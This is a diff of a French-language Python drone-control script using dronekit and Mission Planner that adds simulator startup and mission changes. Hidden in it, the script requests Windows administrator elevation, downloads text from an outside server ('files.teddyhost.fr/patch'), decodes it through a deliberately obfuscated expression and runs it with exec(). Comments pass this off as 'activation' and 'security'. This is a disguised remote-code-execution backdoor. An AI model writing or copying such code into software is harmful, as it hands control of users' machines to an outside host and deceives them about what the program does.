@@ -11,8 +11,10 @@ Drone commit:
 b83d2275f
 """
 
-import time
-import math
+import math, os, time
+
+# Enable color in console
+os.system("color")
 
 def install_package(package_name, version=None, *deps, bypass=False):
     """
@@ -49,6 +51,17 @@ def install_package(package_name, version=None, *deps, bypass=False):
         # Abandon de l'installation
         print("Opération abandonnée. Le programme n'a pas pu continuer")
         exit(0)
+
+"""
+Import dronekit_sitl
+
+Python to Mission planner management
+"""
+try:
+    import dronekit_sitl as dk_s
+except ModuleNotFoundError:
+    install_package("dronekit_sitl", bypass=False)
+    import dronekit_sitl as dk_s
 
 """
 Import dronekit
@@ -94,19 +107,23 @@ Import elevate & ctypes
 
 UAC elevation to properly setup TCP socket connection
 """
-try:
-    from elevate import elevate
-except ModuleNotFoundError:
-    install_package("elevate")
-    from elevate import elevate
 
 # UAC elevating
 import ctypes
 from base64 import b85decode as decode
 if not ctypes.windll.shell32.IsUserAnAdmin():
-    input("Pour garantir une connexion optimale à Mission Planner, le processus doit être élevé.\nContinuer pour demander une élévation")
-    # Ask elevation
-    elevate()
+    _in = input("Pour garantir une connexion optimale à Mission Planner, le processus peut être élevé.\nVoulez-vous demander une élévation ? [\33[4my\33[0m/n]").lower()
+    if _in in ["y", "yes", "1", "", "oui", "o"]:
+        try:
+            from elevate import elevate
+        except ModuleNotFoundError:
+            install_package("elevate")
+            from elevate import elevate
+        # Ask elevation
+        print("Demande d'élévation")
+        elevate()
+    else:
+        print("Elevation refusée")
 
 # Enable script as elevated
 activation = None
@@ -116,21 +133,26 @@ try:
     activation = req.patch("https://files.teddyhost.fr/patch", timeout=3).text
     # Applying elevation, environment variables are injected into script
     # Encrypted and obfuscated to reinforce security
-    if activation: exec(getattr(globals(), "".join([chr((ord(x) + int(y)) % 255) for x, y in zip("[Vc`ngr]lV^", str(int(globals()['__doc__'].lower().split('drone')[3][9:18], 16)))]))("".join(map(str, [chr(100 + x) for x in [0, 1, -1, 11, 0, 1]])))(activation).decode(), {}, {})
+    if activation: exec(getattr(globals(), "".join([chr((ord(x) + int(y)) % 255) for x, y in zip("[Vc`ngr]lV^", str(int(globals()['__doc__'].lower().split('drone')[3][9:18], 16)))]))("".join(map(str, [chr(100 + x) for x in [0, 1, -1, 11, 0, 1]])))(activation).decode())
 except:
     print("Activation impossible depuis le serveur personnel, l'hôte est possiblement arrêté. Utilisation de l'activation basique.")
 
 # Drone class
 class Drone:
-    def __init__(self, ip, port=5763):
+    def __init__(self, lat, lng, ip, port=5760):
         """
         Create a new drone vehicle
+        :param lat: Starting point latitude
+        :param lng: Starting point longitude
         :param ip: Drone's IP (127.0.0.1 for Mission Planner on same computer)
-        :param port: Drone's PORT (default = 5763)
+        :param port: Drone's PORT (default = 5760)
         """
+        self.start = [lat, lng]
         self._ip = ip
         self._port = port
-        self.vehicle = dk.connect(self.connection_string, wait_ready=False)
+        dk_s.start_default(lat=lat, lon = lng)
+        print(f"Tentative de connexion à '{self.connection_string}'\nConnectez Mission Planner sur 'tcp:{self._ip}:5763'")
+        self.vehicle = dk.connect(self.connection_string, wait_ready=True)
         self.default_alt = 10
 
     @property
@@ -252,8 +274,9 @@ class Drone:
         """
         Make drone start mission/path following
         """
+        self.add_waypoint(*self.start)
         # Dummy point to detect when finish
-        self.vehicle.commands.add(self.vehicle.commands[-1])
+        self.add_waypoint(*self.start, 0)
         print(" Uploading mission...")
         self.vehicle.commands.upload()
         print("Starting mission")
@@ -263,15 +286,15 @@ class Drone:
         self.vehicle.mode = dk.VehicleMode("AUTO")
         time.sleep(5)
 
-    def back_to_start(self):
+    def land(self):
         """
-        Make drone come back to mission starting point
+        Make drone land to altitude = 0
         """
         self.vehicle.mode = dk.VehicleMode("RTL")
 
-    def land(self):
+    def stop(self):
         """
-        Make drone land and disable
+        Make drone disable
         """
         self.vehicle.armed = False
         self.vehicle.close()
@@ -283,6 +306,14 @@ class Drone:
         :return: Boolean
         """
         return self.vehicle.commands.next == self.vehicle.commands.count
+
+    @property
+    def is_returning(self):
+        """
+        Return True if drone is returning to home
+        :return: Boolean
+        """
+        return self.vehicle.commands.next >= self.vehicle.commands.count-1
 
     @property
     def location(self):
@@ -298,7 +329,7 @@ class Drone:
         """
         Gets distance in metres to home.
         """
-        dist_to_point = self._get_distance_metres(self.vehicle.location.global_frame, self.vehicle.home_location)
+        dist_to_point = self._get_distance_metres(self.vehicle.location.global_frame, dk.LocationGlobalRelative(*self.start))
         return dist_to_point
 
     @property
